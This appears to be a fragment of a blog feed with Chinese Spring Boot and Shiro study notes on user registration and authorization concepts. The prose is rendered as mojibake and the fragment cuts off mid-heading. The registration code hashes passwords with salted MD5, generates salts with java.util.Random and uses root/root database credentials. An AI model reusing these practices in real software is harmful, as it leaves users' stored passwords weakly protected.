class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç”¨æˆ·æ³¨å†Œ<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageContext.request.contextPath&#125;</span><span class="xml"><span class="tag"><span class="string">/user/register"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        ç”¨æˆ·åï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        å¯†ç ï¼š<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"ç«‹å³æ³¨å†Œ"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>è¿˜è¦å°†å®ƒå’Œè¯·æ±‚éƒ½è®¾ç½®ä¸ºå…¬å…±èµ„æº<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/register"</span>,<span class="string">"anon"</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/register.jsp"</span>,<span class="string">"anon"</span>);</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ–°å»ºä¸€ä¸ªæ•°æ®åº“<br><img src="/img/JavaWeb/11-30å­¦ä¹ æ—¥è®°/1.png" alt="avatar"></p><p>é™¤æ­¤ä¹‹å¤–è¿˜è¦æ·»åŠ mysqlå’Œmybatisç›¸å…³çš„ä¾èµ–<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        mabatisç›¸å…³ä¾èµ–--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        mysqlä¾èµ–--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--        druid--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>é…ç½®æ–‡ä»¶åŒæ ·ä¹Ÿè¦åŠ ä¸Š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">spring<span class="selector-class">.datasource</span>.type=com<span class="selector-class">.alibaba</span><span class="selector-class">.druid</span><span class="selector-class">.pool</span>.DruidDataSource</span><br><span class="line">spring<span class="selector-class">.datasource</span>.driver-class-name=com<span class="selector-class">.mysql</span><span class="selector-class">.cj</span><span class="selector-class">.jdbc</span>.Driver</span><br><span class="line">spring<span class="selector-class">.datasource</span>.url=jdbc:mysql:<span class="comment">//localhost:3306/shiro_spring?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=GMT%2B8&amp;useSSL=false</span></span><br><span class="line">spring<span class="selector-class">.datasource</span>.username=root</span><br><span class="line">spring<span class="selector-class">.datasource</span>.password=root</span><br><span class="line"></span><br><span class="line">mybatis.type-aliases-package=com<span class="selector-class">.ceit</span><span class="selector-class">.springboot_jsp_shiro</span>.entity</span><br><span class="line">mybatis.mapper-locations=classpath:com/ceit/mapper<span class="comment">/*.xml</span></span><br></pre></td></tr></table></figure></p><p>åœ¨resourcesä¸‹å»ºä¸€ä¸ªcom.ceit.mapperåŒ…ç”¨äºå­˜æ”¾mapperé…ç½®æ–‡ä»¶</p><p>åœ¨com.ceit.springboot_jsp_shiroä¸‹å»ºä¸€ä¸ªentityåŒ… åˆ›å»ºä¸€ä¸ªUser.java<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@Accessors(chain = <span class="literal">true</span>)</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> id;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> username;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> password;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> salt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSalt</span><span class="params">(<span class="keyword">String</span> salt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.salt = salt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(<span class="keyword">String</span> password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ¥ç€å¯¹åº”å¼€å‘å¯¹åº”çš„daoæ¥å£  UserDAO.interface<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">package</span> <span class="selector-tag">com</span><span class="selector-class">.ceit</span><span class="selector-class">.springboot_jsp_shiro</span><span class="selector-class">.dao</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">com</span><span class="selector-class">.ceit</span><span class="selector-class">.springboot_jsp_shiro</span><span class="selector-class">.entity</span><span class="selector-class">.User</span>;</span><br><span class="line"><span class="selector-tag">import</span> <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.ibatis</span><span class="selector-class">.annotations</span><span class="selector-class">.Mapper</span>;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">Mapper</span></span><br><span class="line"><span class="keyword">public</span> interface UserDAO &#123;</span><br><span class="line">    <span class="selector-tag">void</span> <span class="selector-tag">save</span>(<span class="selector-tag">User</span> <span class="selector-tag">user</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æ¥ä¸‹æ¥å°±æ˜¯é…ç½®UserDAOMapper.xmläº†<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.ceit.springboot_jsp_shiro.dao.UserDAO"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"save"</span> <span class="attr">parameterType</span>=<span class="string">"User"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        insert into t_user values(#</span><span class="template-variable">&#123;id&#125;</span><span class="xml">,#</span><span class="template-variable">&#123;username&#125;</span><span class="xml">,#</span><span class="template-variable">&#123;password&#125;</span><span class="xml">,#</span><span class="template-variable">&#123;salt&#125;</span><span class="xml">)</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>å†åˆ›å»ºä¸€ä¸ªserviceåŒ… åˆ›å»ºä¸€ä¸ªUserService.interface<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.entity.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//æ³¨å†Œç”¨æˆ·</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">register</span><span class="params">(User user)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯¹åº”çš„UserServiceImpl.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.dao.UserDAO;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.entity.User;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.SaltUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.hash.Md5Hash;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDAO userDAO;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">register</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//å¤„ç†ä¸šåŠ¡è°ƒç”¨dao</span></span><br><span class="line">        <span class="comment">//æ˜æ–‡å¯†ç è¿›è¡Œmd5+salt+hashæ•£åˆ—</span></span><br><span class="line">        <span class="comment">//1. ç”Ÿæˆéšæœºç›</span></span><br><span class="line">        String salt = SaltUtils.getSalt(<span class="number">8</span>);</span><br><span class="line">        <span class="comment">//2. å°†éšæœºç›ä¿å­˜åˆ°æ•°æ®</span></span><br><span class="line">        user.setSalt(salt);</span><br><span class="line">        <span class="comment">//3. æ˜æ–‡å¯†ç è¿›è¡Œmd5+salt+hashæ•£åˆ—</span></span><br><span class="line">        Md5Hash md5Hash = <span class="keyword">new</span> Md5Hash(user.getPassword(),salt,<span class="number">1024</span>);</span><br><span class="line">        user.setPassword(md5Hash.toHex());</span><br><span class="line"></span><br><span class="line">        userDAO.save(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™é‡Œè¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå·¥å…·ç±» å…ˆåˆ›å»ºä¸€ä¸ªUtilsåŒ… åŒ…ä¸‹åˆ›å»ºä¸€ä¸ªSaltUtils.class<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SaltUtils</span> &#123;</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”Ÿæˆsaltçš„é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="comment">     * @param n</span></span><br><span class="line"><span class="comment">     * @return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> <span class="title">getSalt</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()"</span>.toCharArray();</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> aChar = chars[<span class="keyword">new</span> Random().nextInt(chars.length)];</span><br><span class="line">            sb.append(aChar);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">String</span> salt = getSalt(<span class="number">4</span>);</span><br><span class="line">        System.out.<span class="built_in">println</span>(salt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ç”¨äºç”Ÿæˆç›</p><p>æ¥ç€åœ¨Controllerä¸­æ·»åŠ <br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·è®¤è¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"register"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String register(User user)&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            userService.register(user);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/login.jsp"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"redirect:/register.jsp"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸‹æµ‹è¯•ï¼Œè®¿é—®register.jsp  å¦‚æœæ³¨å†Œä¹‹å è·³è½¬åˆ°äº†login.jsp  ç™»é™†ä¸€ä¸‹  å¦‚æœæˆåŠŸäº†  é‚£ä¹ˆå°±å®Œæˆäº†æ³¨å†Œçš„ä¸€ä¸ªæµç¨‹ï¼Œçœ‹ä¸€ä¸‹æ•°æ®åº“ä¸­ä¹Ÿæœ‰äº†å¯¹åº”è´¦å·å’ŒåŠ äº†ç›çš„å¯†ç </p><p>æ³¨æ„äº‹é¡¹ï¼š</p><ol><li><p>druidä¾èµ– ç›´æ¥ä½¿ç”¨druid-spring-boot-starter</p></li><li><p>xmléœ€è¦åŠ ä¸Š&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€?&gt;</p></li><li><p>daoåŒ…ä¸‹çš„DAOåˆ«å¿˜äº†åŠ ä¸Š@Mapper</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringBoot-Shiro&quot;&gt;&lt;a href=&quot;#SpringBoot-Shiro&quot; class=&quot;headerlink&quot; title=&quot;SpringBoot+Shiro&quot;&gt;&lt;/a&gt;SpringBoot+Shiro&lt;/h1&gt;&lt;h2 id=&quot;æ•´åˆæ€è·¯&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/11/19-ç”¨æˆ·æˆæƒ</title>
    <link href="http://yoursite.com/2020/11/19/Shiro-2020-11-19-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/11/19/Shiro-2020-11-19-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-19T10:14:45.000Z</published>
    <updated>2021-02-21T04:57:44.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shiroä¸­æˆæƒçš„æ¦‚å¿µ"><a href="#shiroä¸­æˆæƒçš„æ¦‚å¿µ" class="headerlink" title="shiroä¸­æˆæƒçš„æ¦‚å¿µ"></a>shiroä¸­æˆæƒçš„æ¦‚å¿µ</h1><h2 id="æˆæƒ"><a href="#æˆæƒ" class="headerlink" title="æˆæƒ"></a>æˆæƒ</h2><p>æˆæƒï¼Œå³è®¿é—®æ§åˆ¶ï¼Œæ§åˆ¶è°èƒ½è®¿é—®å“ªäº›èµ„æºï¼Œä¸»ä½“è¿›è¡Œèº«ä»½è®¤è¯åéœ€è¦åˆ†é…æƒé™æ–¹å¯è®¿é—®ç³»ç»Ÿçš„èµ„æºï¼Œå¯¹äºæŸäº›èµ„æºæ²¡æœ‰æƒé™æ˜¯æ— æ³•è®¿é—®çš„</p><h2 id="å…³é”®å¯¹è±¡"><a href="#å…³é”®å¯¹è±¡" class="headerlink" title="å…³é”®å¯¹è±¡"></a>å…³é”®å¯¹è±¡</h2><p>æˆæƒå¯ç®€å•ç†è§£ä¸ºwhoå¯¹what(which)è¿›è¡Œhowæ“ä½œ</p><ul><li><p>Who å³ä¸»ä½“(subject) ä¸»ä½“éœ€è¦è®¿é—®ç³»ç»Ÿä¸­çš„èµ„æº</p></li><li><p>What å³èµ„æº(Resource) å¦‚ç³»ç»Ÿèœå•ï¼Œé¡µé¢ï¼ŒæŒ‰é’®ï¼Œç±»æ–¹æ³•ï¼Œç³»ç»Ÿå•†å“ä¿¡æ¯ç­‰ã€‚èµ„æºåŒ…æ‹¬èµ„æºç±»å‹å’Œèµ„æºå®ä¾‹</p></li><li><p>How å³æƒé™/è®¸å¯(Permission) è§„å®šäº†ä¸»ä½“å¯¹èµ„æºçš„æ“ä½œè®¸å¯ï¼Œæƒé™ç¦»å¼€èµ„æºæ²¡æœ‰æ„ä¹‰ï¼Œå¦‚ç”¨æˆ·æŸ¥è¯¢æƒé™ï¼Œç”¨æˆ·æ·»åŠ æƒé™ï¼ŒæŸä¸ªç±»æ–¹æ³•çš„è°ƒç”¨æƒé™</p></li></ul><h2 id="æˆæƒæµç¨‹"><a href="#æˆæƒæµç¨‹" class="headerlink" title="æˆæƒæµç¨‹"></a>æˆæƒæµç¨‹</h2><p><img src="/img/JavaWeb/11-19å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><h2 id="æˆæƒæ–¹å¼"><a href="#æˆæƒæ–¹å¼" class="headerlink" title="æˆæƒæ–¹å¼"></a>æˆæƒæ–¹å¼</h2><h3 id="åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶"><a href="#åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶" class="headerlink" title="åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶"></a>åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶</h3><ul><li>RBACåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶(Role-Based Access Control) æ˜¯ä»¥è§’è‰²ä¸ºä¸­å¿ƒè¿›è¡Œè®¿é—®æ§åˆ¶<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(subject.hasRole(<span class="string">"admin"</span>)</span></span>)&#123;</span><br><span class="line"><span class="comment">//æ“ä½œä»€ä¹ˆèµ„æº</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="åŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶"><a href="#åŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶" class="headerlink" title="åŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶"></a>åŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶</h3><ul><li>RBACåŸºäºèµ„æºçš„è®¿é—®æ§åˆ¶(Resource-Based Access Control) æ˜¯ä»¥èµ„æºä¸ºä¸­å¿ƒè¿›è¡Œè®¿é—®æ§åˆ¶<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(subject.isPermission(<span class="string">"user:find:*"</span>)</span></span>)&#123;</span><br><span class="line"><span class="comment">//å¯¹æ‰€æœ‰ç”¨æˆ·å…·æœ‰æŸ¥è¯¢æƒé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="æƒé™å­—ç¬¦ä¸²"><a href="#æƒé™å­—ç¬¦ä¸²" class="headerlink" title="æƒé™å­—ç¬¦ä¸²"></a>æƒé™å­—ç¬¦ä¸²</h2><p>æƒé™å­—ç¬¦ä¸²çš„è§„åˆ™æ˜¯ï¼šèµ„æºæ ‡è¯†ç¬¦ï¼šæ“ä½œï¼šèµ„æºå®ä¾‹æ ‡è¯†ç¬¦ï¼Œæ„æ€æ˜¯å¯¹å“ªä¸ªèµ„æºçš„å“ªä¸ªå®ä¾‹å…·æœ‰ä»€ä¹ˆæ“ä½œï¼Œâ€:â€æ˜¯èµ„æº/æ“ä½œ/å®ä¾‹çš„åˆ†å‰²çº¿ï¼Œæƒé™å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ä½¿ç”¨*é€šé…ç¬¦</p><p>ä¾‹å­ï¼š</p><ul><li><p>ç”¨æˆ·åˆ›å»ºæƒé™ï¼šuser:create,æˆ–user:create:*</p></li><li><p>ç”¨æˆ·ä¿®æ”¹å®ä¾‹001çš„æƒé™ï¼šuser:update:001</p></li><li><p>ç”¨æˆ·å®ä¾‹001çš„æ‰€æœ‰æƒé™ï¼šuser:*:001</p></li></ul><h1 id="shiroä¸­çš„æˆæƒå®ç°"><a href="#shiroä¸­çš„æˆæƒå®ç°" class="headerlink" 